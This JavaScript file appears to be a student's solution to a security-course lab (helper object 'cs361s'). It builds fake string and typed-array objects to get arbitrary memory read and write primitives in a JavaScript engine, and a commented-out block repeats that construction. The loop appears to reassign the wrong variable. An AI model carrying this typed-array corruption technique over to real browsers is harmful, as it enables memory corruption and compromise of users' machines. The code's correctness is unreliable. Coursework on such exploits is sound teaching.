/*
 * TODO: Part B solution goes here!
 */
let dataPlane = new Uint32Array(1);
let fakestring = cs361s.fakestr(cs361s.addrof("\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00") + 16);

let originarray = new Uint32Array(72);
while (cs361s.addrof(originarray) < cs361s.addrof(fakestring) || cs361s.addrof(originarray) > cs361s.addrof(fakestring) - 72 + 16 + 10000000) {
    array = new Uint32Array(72);
}

let offset = cs361s.addrof(originarray) - (cs361s.addrof(fakestring) + 16);
let codes = new Uint8Array(72);

var index = 0;
while(index < codes.length){
    codes[index] = fakestring.charCodeAt(offset + index);
    index++;
}


var fb = 0;
while(fb < 8) {
    var bit = 0;
    let temp = cs361s.addrof(dataPlane);
    while(bit < fb) {
        temp = (temp - codes[72 - 16 + bit])/256;
        bit++;
    }   
    codes[72 - 16 + fb] = temp % 256;
    fb++;
}

codes[0] = codes[0] + 1;
let cc = String.fromCharCode(...codes)
let controlPlane = cs361s.fakeobj(cs361s.addrof(cc) + 16);

let fourWordBytes = 2 ** 32;

let readmem = function(addr) {
    controlPlane[14] = addr % fourWordBytes;
    controlPlane[15] = (addr - controlPlane[0]) / fourWordBytes;
    return dataPlane[0];
};

let writemem = function(addr, val) {
    controlPlane[14] = addr % fourWordBytes;
    controlPlane[15] = (addr - controlPlane[0]) / fourWordBytes;
    dataPlane[0] = val;
};



/*
// create the control plane
codes[0] = codes[0] + 1;
let controlPlane = cs361s.fakeobj(cs361s.addrof(String.fromCharCode(...codes)) + 16);

let readmem = function(addr) {
    controlPlane[14] = addr % (Math.pow(2, 32));
    controlPlane[15] = (addr - controlPlane[0]) / (Math.pow(2, 32));
    return dataPlane[0];
};

let writemem = function(addr, val) {
    controlPlane[14] = addr % (Math.pow(2, 32));
    controlPlane[15] = (addr - controlPlane[0]) / (Math.pow(2, 32));
    dataPlane[0] = val;
};
*/
